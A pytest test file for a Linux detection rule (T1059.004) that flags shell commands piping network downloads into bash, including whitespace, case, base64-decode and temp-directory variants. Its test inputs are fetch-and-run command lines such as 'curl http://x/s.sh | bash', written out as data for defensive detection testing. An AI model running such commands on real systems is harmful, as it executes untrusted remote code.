"""
test_t1059_shell_network_tool.py — the live (non-sample) T1059.004 rule:
normalized-command matching and the additional risk indicators added in the
detection-hardening pass.
"""
import pytest
from app.detection.engine.yaml_detection_engine import YAMLDetectionEngine

RULE_ID = "linux_t1059_shell_network_tool"


@pytest.fixture
def engine():
    return YAMLDetectionEngine()


def _shell_event(command_line, name="bash", parent="sshd"):
    return {
        "process": {
            "name": name,
            "command_line": command_line,
            "parent": {"name": parent},
        },
        "user": {"name": "root"},
        "host": {"name": "prod-1"},
    }


def _t1059(engine, event):
    candidates = engine.evaluate_event(event, return_unmatched=True)
    return next((c for c in candidates if c.rule_id == RULE_ID), None)


def test_matches_curl_pipe_bash():
    c = _t1059(YAMLDetectionEngine(), _shell_event("curl http://x/s.sh | bash"))
    assert c is not None and c.matched is True and c.suppressed is False


def test_matches_despite_extra_whitespace():
    # Whitespace-padded command would dodge naive "| bash" matching on the raw
    # string; normalized_command collapses it so the rule still fires.
    c = _t1059(YAMLDetectionEngine(), _shell_event("curl   http://x/s.sh    |    bash"))
    assert c is not None and c.matched is True


def test_chmod_plus_x_adds_score(engine):
    base = _t1059(engine, _shell_event("wget http://x/p | bash"))
    withchmod = _t1059(engine, _shell_event("wget http://x/p -O /root/p; chmod +x /root/p | bash"))
    assert withchmod.risk_score > base.risk_score
    assert any("drop-and-run" in r for r in withchmod.adjustment_reasons)


def test_base64_decode_staging_reason(engine):
    c = _t1059(engine, _shell_event("curl http://x | base64 -d | bash"))
    assert c is not None and c.matched is True
    assert any("decode-and-run" in r for r in c.adjustment_reasons)


def test_var_tmp_execution_reason(engine):
    c = _t1059(engine, _shell_event("curl http://x -o /var/tmp/p | bash"))
    assert any("world-writable temp" in r for r in c.adjustment_reasons)


def test_no_match_without_pipe_to_shell(engine):
    # curl present but no pipe-to-shell / -c indicator -> rule must not match.
    c = _t1059(engine, _shell_event("curl http://x -o /root/file"))
    assert c is None or c.matched is False


def test_command_stored_in_args_via_normalized(engine):
    # Even if the raw command carries mixed case + padding, matching is
    # case-insensitive and whitespace-robust.
    c = _t1059(engine, _shell_event("CURL http://x/s.sh  |  BASH"))
    assert c is not None and c.matched is True
